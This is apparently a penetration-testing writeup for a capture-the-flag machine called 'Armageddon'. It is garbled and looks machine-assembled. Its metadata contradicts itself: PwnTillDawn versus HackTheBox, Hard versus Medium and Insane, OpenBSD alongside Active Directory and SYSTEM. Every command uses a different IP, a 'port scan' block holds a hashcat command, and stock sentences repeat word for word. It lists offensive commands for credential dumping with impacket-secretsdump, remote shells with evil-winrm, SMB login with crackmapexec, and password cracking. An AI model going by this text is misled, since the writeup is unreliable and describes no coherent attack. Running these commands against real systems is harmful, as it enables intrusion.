---
TitleSEO: "PwnTillDawn — Armageddon (Hard OpenBSD) | ZureFX"
TitlePost: "PwnTillDawn — Armageddon (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Armageddon. GPP Password and Pass the Ticket to achieve hard compromise on OpenBSD."
Keywords: "hackthebox, web, active directory, medium, insane"
URL: "https://zurefx.github.io/writeups/htb-armageddon-697.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-armageddon-697/"
Date: "2024-02-26"
Tags: "HackTheBox, Web, Active Directory, Medium, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-armageddon-697"
Permalink: "/writeups/htb-armageddon-697.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Armageddon** is rated **Hard** on PwnTillDawn. It runs **OpenBSD** and the IP address during this analysis was `10.111.101.126`.

### Objectives

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.120.164.244
evil-winrm -i 10.101.135.222 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.127.81.187/FUZZ
nmap -sCV -p389,23,464 10.11.178.23 -oN scan.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

### Web Enumeration

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service.

```bash
evil-winrm -i 10.62.209.48 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target.

Key finding: **Weak Service Permissions**.

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p5986,636,464 10.61.131.12 -oN scan.txt
crackmapexec smb 10.82.60.26 -u administrator -p 'P@ssw0rd!' --shares
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Privilege Escalation

### Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.226.7
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.44.63.32/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

## Summary

### Tools Used

- `wpscan`
- `sqlmap`
- `enum4linux`
- `netcat`
- `dcomexec`
- `smbclient`
- `gobuster`
- `GetNPUsers`

### Key Takeaways

- GPP Password
- Pass the Ticket
- DCSync
- Weak Service Permissions
